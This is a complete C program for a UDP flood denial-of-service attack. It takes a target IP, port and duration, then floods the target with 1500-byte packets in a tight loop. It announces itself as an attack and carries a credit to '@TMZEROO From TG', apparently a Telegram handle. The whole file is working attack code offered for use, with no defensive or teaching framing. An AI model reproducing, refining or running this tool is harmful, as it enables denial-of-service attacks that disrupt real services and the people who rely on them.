#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>

// Function to handle SIGINT signal (Ctrl+C)
void handle_sigint(int sig) {
    printf("\nAttack Interrupted\n");
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <ip> <port> <duration>\n", argv[0]);
        exit(1);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    // Create UDP socket
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket creation failed");
        exit(1);
    }

    // Set up destination address
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &dest_addr.sin_addr) <= 0) {
        fprintf(stderr, "Invalid IP address\n");
        exit(1);
    }

    // Set up signal handler for SIGINT
    signal(SIGINT, handle_sigint);

    // Start attack
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    char buffer[1500];
    memset(buffer, 'A', sizeof(buffer));

    printf("Starting UDP Flood Attack...\n");

    while (time(NULL) < end_time) {
        if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("sendto failed");
            break;
        }
    }

    printf("Attack Finished Message is Finished By @TMZEROO From TG\n");

    close(sockfd);
    return 0;
}
